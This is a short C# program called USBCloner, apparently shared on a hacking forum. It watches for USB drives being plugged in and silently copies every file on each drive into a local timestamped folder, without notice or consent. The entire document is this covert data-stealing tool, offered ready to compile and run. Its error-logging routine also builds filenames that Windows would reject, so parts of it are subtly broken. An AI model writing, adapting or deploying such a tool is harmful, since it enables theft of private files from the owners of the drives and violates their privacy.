using System;
using System.IO;
using System.Management;

namespace USBCloner
{
  class Program
  {
    //@Bunnyslippers69 HackForums\\
    static void Main(string[] args)
    {
      try
      {
        ManagementEventWatcher watcher = new ManagementEventWatcher();
        WqlEventQuery query = new WqlEventQuery("SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2");

        watcher.EventArrived += new EventArrivedEventHandler(watcher_EventArrived);
        watcher.Query = query;
        watcher.Start();
        watcher.WaitForNextEvent();

        Console.ReadLine();
      }
      catch (Exception e)
      {
        ErrorHandler(e);
      }
    }

    //Called when a USB device is plugged in
    static void watcher_EventArrived(object sender, EventArrivedEventArgs e)
    {
      try
      {
        //Declares locations for the file transfer
        DirectoryInfo source = new DirectoryInfo(e.NewEvent.Properties["DriveName"].Value.ToString() + @"\");
        DirectoryInfo dest = new DirectoryInfo(Directory.GetCurrentDirectory() + $@"\Cloned - {DateTime.Now.Millisecond}");

        //Initiates file transfer
        CopyFilesRecursively(source, dest);
      }
      catch (Exception f)
      {
        ErrorHandler(f);
      }
    }

    //Copies files recursively from source to destination
    public static void CopyFilesRecursively(DirectoryInfo source, DirectoryInfo target)
    {
      foreach (DirectoryInfo dir in source.GetDirectories())
        CopyFilesRecursively(dir, target.CreateSubdirectory(dir.Name));
      foreach (FileInfo file in source.GetFiles())
        file.CopyTo(Path.Combine(target.FullName, file.Name));
    }


    //Handles errors, the name is pretty self explanatory you incompotent fool
    private static void ErrorHandler(Exception e)
    {
      string fileName = DateTime.Now + " _error_ Log.txt";
      File.Create(fileName).Close();
      File.WriteAllText(fileName, e.Message);
    }

  }
}